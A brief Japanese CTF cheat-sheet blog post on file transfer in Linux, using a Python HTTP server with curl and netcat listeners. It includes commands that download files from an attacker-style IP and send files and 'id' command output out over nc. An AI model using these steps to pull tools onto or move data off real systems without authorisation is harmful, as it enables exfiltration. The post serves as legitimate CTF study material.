---
layout: post
title: ファイル転送
published : true
permalink: /ctf/cheatsheets/common/file_trancefer
tags: [CTF, Common, cheatsheet, file trancefer, ファイル転送]
---
## linux
### curl
#### 送信側(待受)
```sh
python3 -m http.server 8888
```
#### 受信側
```sh
curl 10.10.14.14:8888/src.file -o dst.file
```
### nc
#### 受信側(待受)
```sh
nc -lvnp 9999 > some-file-name
```
#### 送信側
- ファイルの場合

```sh
nc 10.11.42.116 9999 < ff.tar.gz
```

- コマンド結果の場合
```sh
id | nc 10.11.42.116 9999
```